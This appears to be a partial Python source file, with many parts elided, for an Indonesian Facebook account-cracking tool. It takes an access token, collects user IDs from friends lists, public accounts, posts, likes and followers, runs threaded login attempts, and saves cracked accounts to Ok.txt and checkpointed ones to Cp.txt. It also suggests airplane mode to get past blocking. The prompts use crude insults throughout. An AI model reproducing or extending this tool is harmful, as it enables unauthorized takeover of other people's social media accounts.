...
def banner():
   ...
   ║╔✪⚞☬DIECAY☬⚟✪╗✪║
       INDONESIA 
───────────────────────────────────────────────────────
 [\x1b[1;96m+%s] Author   : Diecay
 [\x1b[1;96m+%s] Github   : -
 [\x1b[1;96m+%s] Facebook : Diecay
───────────────────────────────────────────────────────\n'''%(N,N,N,N))
...
class login:
	...
	def __login__(self):
		os.system('clear')
		banner()
		token = input(' [%s*%s] ISI TOKEN LU TOD : '%(O,N))
		if token in ['']:
			...
			try:
				...
				print('\n [%s+%s] LOGIN BERHASIL TOD %s'%(H,N,cc))
				self.bot()
			except KeyError:
				jalan(' [%s!%s] TOKEN ERORR NGENTD COBA GANTI!'%(M,N))
				self.takon()
	def takon(self):
		takon = input('\n %s[%s!%s] CARA NGAMBIL TOKEN y/t: '%(N,O,N))
		if takon in ['y','Y','iya']:
			jalan('\n %s[%s!%s] Kamu akan di arahkan ke Ke Wa Untuk Donasi'%(N,O,N))
			os.system('xdg-open wa.me/62895401319701');exit()
		else:
			login().__login__()
	def bot(self):
		...
		try:
			...
			jalan('\n [%s!%s] TOKEN MODAR GANTI TOKEN!'%(M,N));time.sleep(1);login().__login__()
...
class menu:
	...
	def main(self):
		...
		try:
			...
			print(' [%s+%s] LUWH BELOM LOGIN ANCRIT'%(M,N));login().__login__()
		try:
		...
		jalan(' %s[ %sWELCOME ANAK ANJ %s%s ]'%(N,H,r,N))
		print(' %s[%s•%s] ALAMAT IP LU : %s'%(N,O,N,IP))
		print(' %s[%s•%s] LU MASUK        : %s'%(N,O,N,waktu))
		print(' %s'%(N))
		print(' %s[%s0%s] KREK DARI DAFTAR TMEN LU TOD'%(N,O,N))
		print(' %s[%s1%s] KREK DARI AKUN PUBLIK TOD'%(N,O,N))
		print(' %s[%s2%s] KREK DARI AKUN MASAL TOD'%(N,O,N))
		print(' %s[%s3%s] KREK DARI POSTINGAN TOD'%(N,O,N))
		print(' %s[%s4%s] KREK DARI LIKE POST TOD'%(N,O,N))
		print(' %s[%s5%s] KREK DARI FOLLOWERS TOD'%(N,O,N))
		print(' %s[%s6%s] CEK OPSI AKUN TOD'%(N,O,N))
		print(' %s[%s7%s] CEK HASIL KREK OK/CP'%(N,O,N))
		print(' %s[%s8%s] SETTINGS User-Agent'%(N,O,N))
		print(' %s[%s9%s] KREK EMAIL'%(N,O,N))
		print(' %s[%sG%s] AMBIL DATA EFBEH'%(N,O,N))
		print(' %s[%sK%s] LAPOR BUG'%(N,O,N))
	...
	def pilih(self):
		...
		if usna in ['']:
			print(' %s'%(N))
			print(' %s[%s!%s] JANGAN KOSONG LAH TOD'%(N,M,N));time.sleep(2);menu().main()
		elif usna in ['0','00']:
			try:
				token = open('token.x','r').read()
			except IOError:
				os.system('rm -rf token.x')
				exit(' %s[%s!%s] CEK TOKEN LUWH'%(N,M,N))
			try:
				...
				print(' %s[%s!%s] AKUN LUWH GA PUBLIK...'%(N,M,N));time.sleep(2);menu().main()
			else:
				crack().fbeh(id)
		elif usna in ['1','01']:
			try:
				...
				os.system('rm -rf token.x')
				exit(' %s[%s!%s] COBA JALANIN ULANG !'%(N,M,N))
			try:
				print(' %s'%(N))
				idt = input(' %s[%s•%s] MASUKIN ID : '%(N,O,N))
			...
			token = open('token.x','r').read()
			try:
				pler = int(input(' %s[%s•%s] CRACK BERAPA ID : '%(N,O,N)))
			except:pler = 1
			for ikeh in range(pler):
				ikeh += 1
				try:
					print(' %s'%(N))
					idt = input(' %s[%s•%s] MASUKIN ID YG MAU LUWH KREK %s : '%(N,O,N,ikeh))
			...
			if hsl in ['1','01']:
				...
				if len(hasil_ok) != 0:
					...
					print(' %s [%s!%s] YAHAHA GA DAPET HASIL :('%(N,O,N))
			elif hsl in ['2','02']:
			...
			nom_wa ='+62895401319701'
			kata = input(' %s [%s!%s] Masukan pesan kamu ke admin : %s'%(N,O,N,H))
			url_wa = ("https://api.whatsapp.com/+62895401319701?phone="+nom_wa+"&text="+kata)
			subprocess.check_output(["am", "start", url_wa])
			exit()
		else:
...
class crack:
	...
	def basic(self):
		print(' %s '%(N))
		print(' %s [%s*%s] AKUN OK DISIMPAN KE FILE : Ok.txt'%(N,O,N))
		print(' %s [%s*%s] AKUN CP DISIMPAN KE FILE : Cp.txt'%(N,O,N))
	...
	def mobilez(self):
		...
		print(' %s [%s*%s] AKUN OK DISIMPAN KE FILE : Ok.txt'%(N,O,N))
		print(' %s [%s*%s] AKUN CP DISIMPAN KE FILE : Cp.txt'%(N,O,N))
		print(' %s [%s!%s] MODE PESAWATKAN DLU JIKA TIDAK ADA HASIL\n'%(N,O,N))
		with khamdihiXD(max_workers=30) as dihi:
			for nama in self.id:
				try:
					uid, name = nama.split('<=>')
